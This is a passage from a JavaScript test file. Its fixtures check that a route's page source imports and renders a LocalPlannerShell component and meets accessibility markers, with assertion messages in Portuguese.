        source: 'const copy = \'from "@/components/local-planner-shell"\'; <LocalPlannerShell />;',
      }]),
      /deve importar e renderizar LocalPlannerShell/,
    );

    assert.throws(
      () => assertUsesFoundation("planejar-fixture", [{
        name: "page.tsx",
        source: 'import { Button } from "@/components"; const LocalPlannerShell = () => null; <LocalPlannerShell />;',
      }]),
      /deve importar e renderizar LocalPlannerShell/,
    );

    assert.doesNotThrow(() =>
      assertUsesFoundation("planejar-fixture", [{
        name: "page.tsx",
        source: 'import { LocalPlannerShell } from "@/components"; <LocalPlannerShell />;',
      }]),
    );

    assert.doesNotThrow(() =>
      assertUsesFoundation("planejar-fixture", [{
        name: "page.tsx",
        source: 'import { LocalPlannerShell } from "@/components/local-planner-shell"; <LocalPlannerShell />;',
      }]),
    );

    assert.doesNotThrow(() =>
      assertPreservesSemantics("planejar-fixture", [{
        name: "page.tsx",
        source: "// <main><h1>exemplo inativo</h1></main>",
      }]),
    );

    assert.throws(
      () => assertFoundationAccessibilitySources(
        '// role="status" aria-live="polite" summaryIcons',
        "/* min-height: 44px; :focus-visible; outline: 3px; @media (max-width: 360px); overflow-wrap: anywhere; @media (forced-colors: active); */",
      ),
      /role="status"/,
    );
  });

  await t.test("contratos falham diante de rota estruturalmente inválida", () => {
    const invalid = [{ name: "page.tsx", source: "export default function Page() { return null; }" }];

    assert.throws(
      () => assertUsesFoundation("planejar-fixture", invalid),
      /deve importar e renderizar LocalPlannerShell/,
    );
  });
});
